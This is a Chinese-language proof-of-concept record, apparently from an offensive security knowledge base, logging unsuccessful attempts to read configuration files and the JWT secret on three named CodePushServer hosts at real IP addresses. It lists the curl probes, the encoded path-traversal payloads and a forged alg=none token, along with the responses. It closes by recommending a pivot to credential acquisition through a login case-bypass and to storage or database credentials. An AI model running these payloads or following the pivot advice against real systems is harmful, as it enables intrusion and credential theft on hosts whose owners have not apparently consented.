# CodePushServer(5432) 无未授权静态/配置读取面 + nginx 400 拦 %2F 穿越（config.js→JWT secret 链路证否）

- **code**: codepushserver-5432-无未授权静态-配置读取面-nginx-400-拦-2f-穿越-confi
- **kind**: poc
- **category**: path-traversal
- **component**: CodePushServer（lisong/code-push-server，Node/Express + openresty）
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-05 task#614，本机 curl.exe -k --noproxy '*' --path-as-is 直连三台 5432，只读 GET 29 发：14 条静态/配置候选（/config/config.js、/package.json、/app.js、/server.js、/routes/index.js、/.git/config、/storage/、/download/、/logs/、/public/ 等）全部 404/20-33B 且正文回显 "GET <path> not found"（Express catch-all，非 nginx 561B）；/download/..%2F..%2Fconfig%2Fconfig.js 与 /download/%2e%2e%2f%2e%2e%2fpackage.json 均 400/163B openresty Bad Request；双编码 %252e 变体 404/74B 原样回显（无二次 decode）；/download/artex614probe、/download/a/b/artex614probe、/storage/artex614probe 全 404 → download/storage 路由不存在；GET /apps 带 alg=none JWT 回 401/12B "Unauthorized"（无 token 时是 41B {"status":401,"name":"UnauthorizedError"}）。
- **path**: pocs/codepushserver-5432-无未授权静态-配置读取面-nginx-400-拦-2f-穿越-confi/codepushserver_unauth_config_read_negative.md
- **tags**: codepushserver, code-push-server, 路径穿越, 配置泄露, negative, openresty, jwt, alg=none
- **created_at**: 2026-11-04T21:45:08.814Z
- **engine**: https://34.92.23.31:5432 / https://35.241.95.15:5432 / https://35.220.211.187:5432
- **found_by**: internal

## 描述

负面情报：判断一台 CodePushServer（Express）是否存在「未授权配置读取/存储穿越」时的快速判据与结论集，避免重复投入。

## 正文

```
# CodePushServer 未授权静态/配置读取 —— 判据与阴性结论

## 1. 基线（判差异的前提）
```
curl.exe -k --noproxy '*' -D - https://TARGET:PORT/
curl.exe -k --noproxy '*' https://TARGET:PORT/zzz_not_exist_$(date +%s)
```
- `/` → 200/1644B, `<title>CodePushServer</title>`, Server: openresty/1.25.3.2
- 随机路径 → **404/33B，正文 `GET /zzz_not_exist_xxx not found`**
关键：应用层 404 是**回显 path 的短文本**（长度随 path 变化），nginx 遮蔽/错误页是固定的 561B(404/403) 或 163B(400)。且该应用**无 SPA fallback**，所以任何非 404 都是真命中。

## 2. 静态/源码/配置候选（全部 404/catch-all，无一可读）
/、/config/config.js、/config/config.json、/config.js、/config/default.js、/package.json、
/app.js、/server.js、/js/app.js、/routes/index.js、/.git/config、/storage/、/logs/、/public/、/download/、
/storage/artex614probe、/download/artex614probe、/download/a/b/artex614probe
→ 全部 404/20-46B 且正文为 `GET <path> not found`。
说明：Express 只挂 `public/` 静态目录且未命中；**/download 与 /storage 路由根本不存在**（存在则会命中路由返回业务错误，不会落 catch-all 并回显原 path）。

## 3. 穿越矩阵（结论：n %2F 在 nginx 层即被 400）
| 请求 | 结果 |
|---|---|
| /download/..%2F..%2Fconfig%2Fconfig.js | **400 / 163B** openresty Bad Request |
| /download/%2e%2e%2f%2e%2e%2fpackage.json | **400 / 163B** 同型 |
| /download/....//config/config.js | 404 应用层 |
| /storage/..%2Fconfig%2Fconfig.js | 404 应用层 |
| /download/%252e%252e%252f%252e%252e%252fconfig%252fconfig.js | 404，回显仍是 %252e（nginx 只解一层，Express 未匹配路由不做二次 decode） |

## 4. JWT 侧（config 读不到时的旁证）
- 无 Authorization 请求 /apps → 41B `{"status":401,"name":"UnauthorizedError"}`
- 带 `alg=none` 伪造 token → **401 / 12B 纯文本 `Unauthorized`**
两条分支可区分 ⇒ 鉴权中间件确实执行到了 verify；alg=none 被 jsonwebtoken 默认算法白名单拒。结合「默认 tokenSecret 伪造失败」可判断 secret 为自定义值。

## 5. 正确转向
不要继续在签名算法层打转。该部署剩余入口是：①凭据获取（/auth/Login 大小写绕过后的口令/账户，注意锁定机制）；②匿名 /updateCheck（需真实 deploymentKey）；③对象存储/DB 侧凭据。

```
